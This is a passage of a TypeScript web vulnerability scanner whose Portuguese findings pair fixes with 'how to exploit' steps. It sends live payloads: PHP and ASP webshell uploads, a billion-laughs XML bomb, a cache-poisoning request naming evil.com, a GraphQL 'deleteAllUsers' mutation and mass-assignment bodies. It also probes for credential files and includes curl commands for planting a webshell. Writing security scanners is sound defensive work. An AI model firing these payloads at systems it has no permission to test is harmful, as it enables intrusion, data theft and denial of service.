              const response = await this.makeRequest(target, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: payload
              });

              const body = response.body.toLowerCase();
              if (response.statusCode === 200 || body.includes('admin') || body.includes('prototype')) {
                return {
                  scanId,
                  severity: "high",
                  title: "Prototype Pollution (JavaScript)",
                  description: "Objeto prototype do JavaScript poluído com propriedades maliciosas. Bypass de autenticação e RCE possível.",
                  category: "Injection",
                  endpoint: target,
                  payload: payload,
                  evidence: `Pollution aceita. Status: ${response.statusCode}`,
                  recommendation: "Valide objetos JSON. Use Object.freeze(). Evite merge/extend com dados não confiáveis.",
                  cve: "CWE-1321",
                };
              }
            }
          } catch (error) {
            return null;
          }
          return null;
        }
      },
      {
        name: "Race Condition (TOCTOU)",
        execute: async (target: string, scanId: string): Promise<InsertVulnerability | null> => {
          try {
            const promises = [];
            for (let i = 0; i < 10; i++) {
              promises.push(this.makeRequest(target, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ amount: 1000, action: 'withdraw' })
              }));
            }

            const responses = await Promise.all(promises);
            const successCount = responses.filter(r => r.statusCode === 200).length;

            if (successCount > 1) {
              return {
                scanId,
                severity: "high",
                title: "Race Condition (TOCTOU)",
                description: "Aplicação vulnerável a condições de corrida. Múltiplas operações simultâneas processadas sem lock.",
                category: "Logic",
                endpoint: target,
                payload: '10 requisições simultâneas',
                evidence: `${successCount} requisições processadas com sucesso simultaneamente`,
                recommendation: "Implemente locks/mutexes. Use transações atômicas. Valide estado antes de operações críticas.",
                cve: "CWE-362",
              };
            }
          } catch (error) {
            return null;
          }
          return null;
        }
      },
      {
        name: "Mass Assignment",
        execute: async (target: string, scanId: string): Promise<InsertVulnerability | null> => {
          try {
            const massPayloads = [
              '{"username":"test","isAdmin":true}',
              '{"email":"test@test.com","role":"admin"}',
              '{"password":"test","privileges":"*"}'
            ];

            for (const payload of massPayloads) {
              const response = await this.makeRequest(target, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: payload
              });

              const body = response.body.toLowerCase();
              if (body.includes('admin') || body.includes('role') || body.includes('privileges')) {
                return {
                  scanId,
                  severity: "high",
                  title: "Mass Assignment Vulnerability",
                  description: "Aplicação aceita parâmetros não esperados. Escalação de privilégios possível.",
                  category: "Authorization",
                  endpoint: target,
                  payload: payload,
                  evidence: `Parâmetros sensíveis aceitos. Response: ${body.substring(0, 200)}`,
                  recommendation: "Use whitelist de campos permitidos. Implemente DTOs. Valide entrada estritamente.",
                  cve: "CWE-915",
                };
              }
            }
          } catch (error) {
            return null;
          }
          return null;
        }
      },
      {
        name: "GraphQL Introspection & Injection",
        execute: async (target: string, scanId: string): Promise<InsertVulnerability | null> => {
          try {
            const graphqlPayloads = [
              '{"query":"{__schema{types{name}}}"}',
              '{"query":"mutation{deleteAllUsers}"}',
              '{"query":"{users(limit:9999){id password}}"}',
              '{"query":"query{__type(name:\"User\"){fields{name}}}"}'
            ];

            for (const payload of graphqlPayloads) {
              const testUrl = target.includes('graphql') ? target : `${target}/graphql`;

              const response = await this.makeRequest(testUrl, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: payload
              });

              const body = response.body.toLowerCase();
              if (body.includes('__schema') || body.includes('__type') || body.includes('users')) {
                return {
                  scanId,
                  severity: "medium",
                  title: "GraphQL Introspection Ativada",
                  description: "GraphQL introspection habilitada. Schema completo exposto para atacantes.",
                  category: "Configuration",
                  endpoint: testUrl,
                  payload: payload,
                  evidence: `Schema exposto. Response: ${body.substring(0, 200)}`,
                  recommendation: "Desabilite introspection em produção. Implemente rate limiting. Valide queries.",
                  cve: "CWE-200",
                };
              }
            }
          } catch (error) {
            return null;
          }
          return null;
        }
      },
      {
        name: "CSRF Token Check",
        execute: async (target: string, scanId: string): Promise<InsertVulnerability | null> => {
          try {
            const response = await this.makeRequest(target);
            const body = response.body.toLowerCase();

            const hasCSRFToken = body.includes('csrf') || body.includes('_token') || 
                               body.includes('authenticity_token') || body.includes('xsrf');

            if (!hasCSRFToken && (body.includes('<form') || body.includes('method="post"'))) {
              return {
                scanId,
                severity: "medium",
                title: "Missing CSRF Protection",
                description: "Forms detected without apparent CSRF token protection.",
                category: "CSRF",
                endpoint: target,
                payload: "N/A",
                evidence: `Forms found without CSRF tokens. Status: ${response.statusCode}`,
                recommendation: "Implement CSRF tokens for all state-changing operations.",
                cve: "CWE-352",
              };
            }
          } catch (error) {
            return null;
          }
          return null;
        }
      }
    ];

    const headerTests = [
      {
        name: "Security Headers Check",
        execute: async (target: string, scanId: string): Promise<InsertVulnerability | null> => {
          try {
            const response = await this.makeRequest(target);
            const headers = response.headers;

            const missingHeaders: string[] = [];

            if (!headers['x-frame-options']) missingHeaders.push('X-Frame-Options');
            if (!headers['x-content-type-options']) missingHeaders.push('X-Content-Type-Options');
            if (!headers['content-security-policy']) missingHeaders.push('Content-Security-Policy');
            if (!headers['strict-transport-security']) missingHeaders.push('Strict-Transport-Security');
            if (!headers['x-xss-protection']) missingHeaders.push('X-XSS-Protection');

            if (missingHeaders.length > 0) {
              return {
                scanId,
                severity: missingHeaders.length >= 3 ? "medium" : "low",
                title: "Faltam Headers de Segurança",
                description: `A aplicação não possui ${missingHeaders.length} headers importantes de segurança.`,
                category: "Headers",
                endpoint: target,
                payload: `Teste de headers HTTP (GET ${target})`,
                evidence: `Headers faltando: ${missingHeaders.join(', ')}. Status HTTP: ${response.statusCode}`,
                recommendation: `RECOMENDAÇÃO: Adicione os seguintes headers:\n- ${missingHeaders.join('\n- ')}\n\nExemplo de configuração:\nX-Frame-Options: DENY\nX-Content-Type-Options: nosniff\nContent-Security-Policy: default-src 'self'\nStrict-Transport-Security: max-age=31536000; includeSubDomains\nX-XSS-Protection: 1; mode=block`,
                cve: "CWE-1021",
              };
            }
          } catch (error) {
            return null;
          }
          return null;
        }
      }
    ];

    const sslTests = [
      {
        name: "SSL/TLS Configuration",
        execute: async (target: string, scanId: string): Promise<InsertVulnerability | null> => {
          try {
            if (!target.startsWith('https://')) {
              return {
                scanId,
                severity: "high",
                title: "HTTPS/SSL Não Detectado",
                description: "A aplicação não usa HTTPS, expondo dados a interceptação (man-in-the-middle).",
                category: "SSL/TLS",
                endpoint: target,
                payload: `Verificação de protocolo: ${target}`,
                evidence: `URL usa HTTP inseguro: ${target}`,
                recommendation: "CRÍTICO: Implemente HTTPS com certificado SSL válido.\n\nCOMO EXPLORAR:\n1. Intercepte tráfego com Wireshark/tcpdump\n2. Capture credenciais em texto plano\n3. Execute ataques MITM com mitmproxy\n\nCOMO CORRIGIR:\n- Obtenha certificado SSL (Let's Encrypt grátis)\n- Configure redirecionamento HTTP -> HTTPS\n- Force HTTPS em todas as páginas",
                cve: "CWE-319",
              };
            }

            const response = await this.makeRequest(target);
            const hstsHeader = response.headers['strict-transport-security'];

            if (!hstsHeader) {
              return {
                scanId,
                severity: "medium",
                title: "Falta Header HSTS",
                description: "HTTPS ativo mas sem HSTS. Permite ataques de downgrade para HTTP.",
                category: "SSL/TLS",
                endpoint: target,
                payload: `Teste HSTS header (GET ${target})`,
                evidence: `Header Strict-Transport-Security ausente. Status: ${response.statusCode}`,
                recommendation: "ADICIONE o header HSTS:\n\nStrict-Transport-Security: max-age=31536000; includeSubDomains; preload\n\nCOMO EXPLORAR:\n1. Force usuário a acessar HTTP (strip SSL)\n2. Intercepte primeira conexão antes do HTTPS\n3. Use sslstrip para downgrade attack\n\nCOMO CORRIGIR:\n- Adicione header em todas respostas HTTPS\n- Use max-age de pelo menos 1 ano\n- Considere preload list do Chrome",
                cve: "CWE-523",
              };
            }
          } catch (error) {
            return null;
          }
          return null;
        }
      }
    ];

    const apiTests = [
      {
        name: "Rate Limiting Check",
        execute: async (target: string, scanId: string): Promise<InsertVulnerability | null> => {
          try {
            const requests = 50;
            let successCount = 0;

            const promises = [];
            for (let i = 0; i < requests; i++) {
              promises.push(
                this.makeRequest(target).then(r => {
                  if (r.statusCode === 200) successCount++;
                  return r;
                }).catch(() => null)
              );
            }

            await Promise.all(promises);

            if (successCount >= requests * 0.8) {
              return {
                scanId,
                severity: "medium",
                title: "Rate Limiting Ausente",
                description: `${successCount}/${requests} requisições processadas sem throttling. Brute-force e DoS possível.`,
                category: "Configuration",
                endpoint: target,
                payload: `${requests} requisições simultâneas em <2s`,
                evidence: `${successCount} requisições bem-sucedidas sem rate limit.`,
                recommendation: `IMPLEMENTE rate limiting!\n\nCOMO EXPLORAR:\n1. Brute-force de senhas: 1000+ tentativas/segundo\n2. DoS via requisições massivas\n3. Bypass de CAPTCHAs\n4. Credential stuffing attacks\n\nFERRAMENTAS:\n- Hydra (brute-force)\n- LOIC/HOIC (DoS)\n- Burp Intruder\n\nCOMO CORRIGIR:\n- Express: express-rate-limit\n- Nginx: limit_req_zone\n- Implemente: 100 req/min por IP\n- Use Redis para tracking distribuído`,
                cve: "CWE-770",
              };
            }
          } catch (error) {
            return null;
          }
          return null;
        }
      },
      {
        name: "HTTP Parameter Pollution",
        execute: async (target: string, scanId: string): Promise<InsertVulnerability | null> => {
          try {
            const hppTests = [
              `${target}?id=1&id=2`,
              `${target}?user=normal&user=admin`,
              `${target}?role=user&role=admin`
            ];

            for (const testUrl of hppTests) {
              const response = await this.makeRequest(testUrl);
              const body = response.body.toLowerCase();

              if (response.statusCode === 200 && (body.includes('admin') || body.includes('2'))) {
                return {
                  scanId,
                  severity: "medium",
                  title: "HTTP Parameter Pollution (HPP)",
                  description: "Aplicação processa parâmetros duplicados de forma insegura. Bypass de validação possível.",
                  category: "Logic",
                  endpoint: testUrl,
                  payload: testUrl.split('?')[1],
                  evidence: `Parâmetros duplicados processados. Response: ${body.substring(0, 200)}`,
                  recommendation: `VALIDE parâmetros duplicados!\n\nCOMO EXPLORAR:\n1. ?user=normal&user=admin → usa último valor\n2. Bypass WAFs com pollution\n3. ?amount=1&amount=1000 → transfere 1000\n\nCOMO CORRIGIR:\n- Rejeite parâmetros duplicados\n- Use apenas primeiro ou último valor consistentemente\n- Valide antes de processar`,
                  cve: "CWE-235",
                };
              }
            }
          } catch (error) {
            return null;
          }
          return null;
        }
      }
    ];

    const networkTests = [
      {
        name: "Information Disclosure",
        execute: async (target: string, scanId: string): Promise<InsertVulnerability | null> => {
          try {
            const response = await this.makeRequest(target);
            const serverHeader = response.headers['server'];
            const poweredBy = response.headers['x-powered-by'];

            if (serverHeader || poweredBy) {
              return {
                scanId,
                severity: "low",
                title: "Vazamento de Informações via Headers",
                description: "Servidor revela versões de software que auxiliam atacantes no reconhecimento.",
                category: "Network",
                endpoint: target,
                payload: `Fingerprinting HTTP headers (GET ${target})`,
                evidence: `Server: ${serverHeader || 'Não encontrado'}, X-Powered-By: ${poweredBy || 'Não encontrado'}`,
                recommendation: "REMOVA ou OFUSQUE headers que revelam versões:\n\nCOMO EXPLORAR:\n1. Identifique versões exatas do software\n2. Pesquise CVEs específicas para essas versões\n3. Use exploits direcionados (ex: Apache 2.4.49 Path Traversal)\n4. Automatize com tools: Wappalyzer, WhatWeb, Nmap\n\nCOMO CORRIGIR:\n- Apache: ServerTokens Prod, ServerSignature Off\n- Nginx: server_tokens off;\n- Express.js: app.disable('x-powered-by')\n- PHP: expose_php = Off",
                cve: "CWE-200",
              };
            }
          } catch (error) {
            return null;
          }
          return null;
        }
      },
      {
        name: "Exposed Sensitive Directories",
        execute: async (target: string, scanId: string): Promise<InsertVulnerability | null> => {
          try {
            const baseUrl = new URL(target).origin;
            const sensitivePaths = [
              '/.git/config',
              '/.git/HEAD',
              '/.env',
              '/.env.local',
              '/.env.production',
              '/backup.sql',
              '/backup.zip',
              '/database.sql',
              '/.DS_Store',
              '/web.config',
              '/.htaccess',
              '/phpinfo.php',
              '/admin/',
              '/administrator/',
              '/wp-admin/',
              '/.aws/credentials',
              '/composer.json',
              '/package.json',
              '/.npmrc',
              '/id_rsa',
              '/.ssh/id_rsa'
            ];

            for (const path of sensitivePaths) {
              try {
                const testUrl = `${baseUrl}${path}`;
                const response = await this.makeRequest(testUrl);

                if (response.statusCode === 200 && response.body.length > 0) {
                  return {
                    scanId,
                    severity: path.includes('.git') || path.includes('.env') || path.includes('id_rsa') ? "critical" : "high",
                    title: "Diretório/Arquivo Sensível Exposto",
                    description: `Arquivo sensível acessível: ${path}. Pode conter código-fonte, credenciais ou configurações.`,
                    category: "Configuration",
                    endpoint: testUrl,
                    payload: `GET ${path}`,
                    evidence: `Arquivo acessível (${response.body.length} bytes). Status: ${response.statusCode}. Preview: ${response.body.substring(0, 150)}`,
                    recommendation: `CRÍTICO: Bloqueie acesso a arquivos sensíveis!\n\nCOMO EXPLORAR:\n1. Download do repositório .git completo: git-dumper\n2. Extração de secrets do .env\n3. Download de backups de banco de dados\n4. Acesso a chaves SSH privadas\n\nCOMO CORRIGIR:\n- Adicione regras no .gitignore\n- Configure deny rules no servidor (nginx/apache)\n- Nunca versione .env ou backups\n- Use secrets management (Vault, AWS Secrets Manager)`,
                    cve: "CWE-548",
                  };
                }
              } catch (err) {
                continue;
              }
            }
          } catch (error) {
            return null;
          }
          return null;
        }
      },
      {
        name: "API Enumeration & Broken Authentication",
        execute: async (target: string, scanId: string): Promise<InsertVulnerability | null> => {
          try {
            const baseUrl = new URL(target).origin;
            const apiPaths = [
              '/api/users',
              '/api/v1/users',
              '/api/admin',
              '/api/config',
              '/api/debug',
              '/graphql',
              '/api/swagger',
              '/api/docs',
              '/api/healthcheck',
              '/api/internal'
            ];

            for (const path of apiPaths) {
              try {
                const testUrl = `${baseUrl}${path}`;
                const response = await this.makeRequest(testUrl);

                if (response.statusCode === 200 && response.body.length > 50) {
                  const body = response.body.toLowerCase();
                  if (body.includes('user') || body.includes('password') || body.includes('token') || 
                      body.includes('email') || body.includes('admin')) {
                    return {
                      scanId,
                      severity: "high",
                      title: "API Endpoint Sem Autenticação",
                      description: `Endpoint de API acessível sem autenticação: ${path}. Exposição de dados sensíveis.`,
                      category: "Authentication",
                      endpoint: testUrl,
                      payload: `GET ${path} (sem credentials)`,
                      evidence: `Endpoint retornou dados sensíveis. Status: ${response.statusCode}. Preview: ${response.body.substring(0, 200)}`,
                      recommendation: `IMPLEMENTE autenticação em ALL endpoints!\n\nCOMO EXPLORAR:\n1. Enumere todos endpoints com ffuf/dirb\n2. Extraia dados de usuários/admin\n3. Teste IDOR (Insecure Direct Object Reference)\n4. Bruteforce IDs: /api/users/1, /api/users/2, etc\n\nCOMO CORRIGIR:\n- Requer autenticação JWT/OAuth em TODOS endpoints\n- Implemente rate limiting\n- Valide permissões (RBAC)\n- Oculte endpoints internos`,
                      cve: "CWE-287",
                    };
                  }
                }
              } catch (err) {
                continue;
              }
            }
          } catch (error) {
            return null;
          }
          return null;
        }
      },
      {
        name: "Clickjacking Vulnerability",
        execute: async (target: string, scanId: string): Promise<InsertVulnerability | null> => {
          try {
            const response = await this.makeRequest(target);
            const xFrameOptions = response.headers['x-frame-options'];
            const csp = response.headers['content-security-policy'];

            const hasFrameProtection = xFrameOptions || (csp && csp.includes('frame-ancestors'));

            if (!hasFrameProtection) {
              return {
                scanId,
                severity: "medium",
                title: "Vulnerabilidade de Clickjacking",
                description: "Aplicação pode ser embedada em iframe malicioso. Clickjacking e UI redressing possível.",
                category: "Configuration",
                endpoint: target,
                payload: `<iframe src="${target}"></iframe>`,
                evidence: `X-Frame-Options ausente e CSP frame-ancestors não configurado. Status: ${response.statusCode}`,
                recommendation: `ADICIONE proteção contra iframes:\n\nCOMO EXPLORAR:\n1. Crie página maliciosa com iframe transparente\n2. Sobreponha botões falsos sobre a aplicação\n3. Induz usuário a clicar em ações não intencionais\n4. Rouba clicks para transferências, posts, etc\n\nPOC HTML:\n<iframe src="${target}" style="opacity:0.1"></iframe>\n<button style="position:absolute">Clique Aqui</button>\n\nCOMO CORRIGIR:\n- X-Frame-Options: DENY ou SAMEORIGIN\n- CSP: frame-ancestors 'self'\n- Use SameSite cookies`,
                cve: "CWE-1021",
              };
            }
          } catch (error) {
            return null;
          }
          return null;
        }
      },
      {
        name: "HTTP Methods Allowed",
        execute: async (target: string, scanId: string): Promise<InsertVulnerability | null> => {
          try {
            const response = await this.makeRequest(target, { method: 'OPTIONS' });
            const allowHeader = response.headers['allow'] || response.headers['access-control-allow-methods'];

            if (allowHeader) {
              const methods = allowHeader.toUpperCase();
              const dangerousMethods = ['PUT', 'DELETE', 'TRACE', 'CONNECT'];
              const foundDangerous = dangerousMethods.filter(m => methods.includes(m));

              if (foundDangerous.length > 0) {
                return {
                  scanId,
                  severity: "medium",
                  title: "Métodos HTTP Perigosos Permitidos",
                  description: `Métodos HTTP perigosos habilitados: ${foundDangerous.join(', ')}. Manipulação de recursos possível.`,
                  category: "Configuration",
                  endpoint: target,
                  payload: `OPTIONS ${target}`,
                  evidence: `Allow: ${allowHeader}`,
                  recommendation: `DESABILITE métodos desnecessários!\n\nCOMO EXPLORAR:\n1. PUT: Upload de arquivos maliciosos\n2. DELETE: Remoção de recursos\n3. TRACE: XSS via cross-site tracing\n\nEXEMPLO:\ncurl -X PUT ${target}/shell.php -d @webshell.php\ncurl -X DELETE ${target}/important-file\n\nCOMO CORRIGIR:\n- Apache: Limit GET POST\n- Nginx: limit_except GET POST { deny all; }\n- Express: router.all('*', (req,res) => { if (!['GET','POST'].includes(req.method)) res.status(405) })`,
                  cve: "CWE-650",
                };
              }
            }
          } catch (error) {
            return null;
          }
          return null;
        }
      },
      {
        name: "Subdomain Takeover",
        execute: async (target: string, scanId: string): Promise<InsertVulnerability | null> => {
          try {
            const hostname = new URL(target).hostname;
            const subdomainPatterns = [
              `dev.${hostname}`,
              `staging.${hostname}`,
              `test.${hostname}`,
              `beta.${hostname}`,
              `admin.${hostname}`
            ];

            for (const subdomain of subdomainPatterns) {
              try {
                const testUrl = `${new URL(target).protocol}//${subdomain}`;
                const response = await this.makeRequest(testUrl);
                const body = response.body.toLowerCase();

                if (body.includes('404') || body.includes('not found') || 
                    body.includes('no such app') || body.includes('heroku') ||
                    body.includes('github pages') || body.includes('s3')) {
                  return {
                    scanId,
                    severity: "high",
                    title: "Possível Subdomain Takeover",
                    description: `Subdomínio ${subdomain} aponta para serviço não configurado. Takeover possível.`,
                    category: "Configuration",
                    endpoint: testUrl,
                    payload: `DNS lookup + HTTP GET ${testUrl}`,
                    evidence: `Resposta indica serviço não configurado: ${body.substring(0, 150)}`,
                    recommendation: `VERIFIQUE e REMOVA subdomínios órfãos!\n\nCOMO EXPLORAR:\n1. Registre aplicação no serviço (Heroku/AWS/GitHub Pages)\n2. Configure mesmo subdomínio\n3. Sirva conteúdo malicioso sob seu domínio\n4. Phishing perfeito com SSL válido\n\nFERRAMENTAS:\n- subjack\n- SubOver\n- can-i-take-over-xyz (GitHub)\n\nCOMO CORRIGIR:\n- Remova registros DNS órfãos\n- Monitore subdomínios periodicamente\n- Use CAA records no DNS`,
                    cve: "CWE-350",
                  };
                }
              } catch (err) {
                continue;
              }
            }
          } catch (error) {
            return null;
          }
          return null;
        }
      },
      {
        name: "File Upload Bypass",
        execute: async (target: string, scanId: string): Promise<InsertVulnerability | null> => {
          try {
            const maliciousFiles = [
              { name: 'shell.php', content: '<?php system($_GET["cmd"]); ?>', contentType: 'image/jpeg' },
              { name: 'shell.phtml', content: '<?php eval($_POST["c"]); ?>', contentType: 'image/png' },
              { name: 'test.jpg.php', content: '<?php phpinfo(); ?>', contentType: 'image/jpeg' },
              { name: 'shell.asp', content: '<%eval request("c")%>', contentType: 'image/gif' },
            ];

            for (const file of maliciousFiles) {
              const boundary = '----WebKitFormBoundary' + Math.random().toString(36).substring(7);
              const body = `--${boundary}\r\nContent-Disposition: form-data; name="file"; filename="${file.name}"\r\nContent-Type: ${file.contentType}\r\n\r\n${file.content}\r\n--${boundary}--`;

              const response = await this.makeRequest(target, {
                method: 'POST',
                headers: {
                  'Content-Type': `multipart/form-data; boundary=${boundary}`
                },
                body
              });

              const responseBody = response.body.toLowerCase();
              if (response.statusCode === 200 || responseBody.includes('upload') || responseBody.includes('success')) {
                return {
                  scanId,
                  severity: "critical",
                  title: "Bypass de Validação de Upload",
                  description: `Upload de arquivo malicioso permitido: ${file.name}. RCE possível.`,
                  category: "Upload",
                  endpoint: target,
                  payload: file.content,
                  evidence: `Arquivo ${file.name} aceito. Content-Type: ${file.contentType}. Status: ${response.statusCode}`,
                  recommendation: `IMPLEMENTE validação REAL de arquivos!\n\nCOMO EXPLORAR:\n1. Bypass extension: shell.php.jpg → rename para .php\n2. Content-Type spoofing: PHP com MIME image/jpeg\n3. Double extension: file.jpg.php\n4. Null byte: shell.php%00.jpg\n5. Upload webshell e execute: ?cmd=whoami\n\nCOMO CORRIGIR:\n- Valide MAGIC BYTES (não só extensão)\n- Renomeie arquivos para random UUID\n- Armazene fora do webroot\n- Use virus scanning (ClamAV)\n- Disable script execution no diretório de uploads`,
                  cve: "CWE-434",
                };
              }
            }
          } catch (error) {
            return null;
          }
          return null;
        }
      },
      {
        name: "IDOR (Insecure Direct Object Reference)",
        execute: async (target: string, scanId: string): Promise<InsertVulnerability | null> => {
          try {
            const baseUrl = target.replace(/\/$/, '');
            const idorPatterns = [
              '/api/users/1',
              '/api/users/2',
              '/api/users/999',
              '/api/profile/1',
              '/api/documents/1',
              '/api/orders/1',
              '/user?id=1',
              '/user?id=2'
            ];

            const results: { url: string, status: number, hasData: boolean }[] = [];

            for (const pattern of idorPatterns.slice(0, 4)) {
              try {
                const testUrl = baseUrl + pattern;
                const response = await this.makeRequest(testUrl);

                if (response.statusCode === 200 && response.body.length > 20) {
                  results.push({
                    url: testUrl,
                    status: response.statusCode,
                    hasData: response.body.includes('user') || response.body.includes('email')
                  });
                }
              } catch (err) {
                continue;
              }
            }

            if (results.length >= 2 && results.every(r => r.hasData)) {
              return {
                scanId,
                severity: "high",
                title: "IDOR - Acesso Não Autorizado a Objetos",
                description: `${results.length} endpoints acessíveis com IDs sequenciais. Enumeração de dados de outros usuários possível.`,
                category: "Authorization",
                endpoint: results[0].url,
                payload: `GET ${results.map(r => r.url).join(', ')}`,
                evidence: `${results.length} IDs retornaram dados. Status: 200. IDs testados: 1, 2, 999.`,
                recommendation: `IMPLEMENTE autorização por objeto!\n\nCOMO EXPLORAR:\n1. Identifique padrão de IDs (sequencial, UUID, etc)\n2. Enumere todos IDs: for i in {1..1000}; do curl /api/users/$i; done\n3. Extraia dados de outros usuários\n4. Modifique dados com PUT/PATCH\n\nFERRAMENTAS:\n- Burp Intruder (brute force IDs)\n- FFUF com wordlist numérica\n\nCOMO CORRIGIR:\n- Valide ownership: if (user.id != requestedId) return 403\n- Use UUIDs não sequenciais\n- Implemente ACLs (Access Control Lists)`,
                cve: "CWE-639",
              };
            }
          } catch (error) {
            return null;
          }
          return null;
        }
      },
      {
        name: "XML Bomb (Billion Laughs Attack)",
        execute: async (target: string, scanId: string): Promise<InsertVulnerability | null> => {
          try {
            const xmlBomb = `<?xml version="1.0"?>
<!DOCTYPE lolz [
  <!ENTITY lol "lol">
  <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
  <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
]>
<data>&lol4;</data>`;

            const startTime = Date.now();
            const response = await this.makeRequest(target, {
              method: 'POST',
              headers: { 'Content-Type': 'application/xml' },
              body: xmlBomb
            });
            const duration = Date.now() - startTime;

            if (duration > 3000 || response.statusCode === 500 || response.statusCode === 503) {
              return {
                scanId,
                severity: "high",
                title: "XML Bomb (Billion Laughs DoS)",
                description: "Parser XML vulnerável a expansion attacks. DoS via consumo de memória/CPU.",
                category: "DoS",
                endpoint: target,
                payload: xmlBomb,
                evidence: `Parser levou ${duration}ms ou crashou. Status: ${response.statusCode}`,
                recommendation: `DESABILITE entity expansion!\n\nCOMO EXPLORAR:\n1. Envie XML bomb com expansão exponencial\n2. Cause consumo de 3GB+ RAM em segundos\n3. Crash do servidor (DoS)\n\nCOMO CORRIGIR:\n- Limite entity expansion (PHP: libxml_disable_entity_loader)\n- Use parsers seguros (Python: defusedxml)\n- Implemente timeout de processamento XML\n- Limite tamanho de payload`,
                cve: "CWE-776",
              };
            }
          } catch (error) {
            return null;
          }
          return null;
        }
      },
      {
        name: "Cache Poisoning",
        execute: async (target: string, scanId: string): Promise<InsertVulnerability | null> => {
          try {
            const poisonPayload = '<script>alert(document.domain)</script>';
            const response = await this.makeRequest(target, {
              headers: {
                'X-Forwarded-Host': `evil.com`,
                'X-Original-URL': `/${poisonPayload}`,
                'X-Rewrite-URL': `/${poisonPayload}`
              }
            });

            const cacheHeader = response.headers['x-cache'] || response.headers['cf-cache-status'];
            const body = response.body;

            if ((cacheHeader && cacheHeader.includes('HIT')) || body.includes('evil.com') || body.includes(poisonPayload)) {
              return {
                scanId,
                severity: "high",
                title: "Web Cache Poisoning",
                description: "Cache reflete headers maliciosos. Ataques persistentes a todos usuários possível.",
                category: "Cache",
                endpoint: target,
                payload: `X-Forwarded-Host: evil.com`,
                evidence: `Cache: ${cacheHeader || 'Unknown'}. Response refletiu header malicioso.`,
                recommendation: `CONFIGURE cache keys corretamente!\n\nCOMO EXPLORAR:\n1. Injete XSS via X-Forwarded-Host\n2. Resposta é cacheada para todos usuários\n3. XSS persistente sem modificar banco de dados\n\nFERRAMENTAS:\n- Param Miner (Burp extension)\n- Web Cache Vulnerability Scanner\n\nCOMO CORRIGIR:\n- Use apenas headers confiáveis como cache key\n- Valide/sanitize todos headers antes de refletir\n- Configure Vary header corretamente`,
                cve: "CWE-444",
              };
            }
          } catch (error) {
            return null;
          }
          return null;
        }
      }
    ];

    switch (scanType) {
      case 'web':
        return webTests;
      case 'network':
        return networkTests;
      case 'ssl':
        return sslTests;
      case 'headers':
        return headerTests;
      case 'full':
        return [...webTests, ...apiTests, ...headerTests, ...sslTests, ...networkTests];
      default:
        return webTests;
    }
  }

  private delay(ms: number): Promise<void> {
    return new Promise(resolve => setTimeout(resolve, ms));
  }
}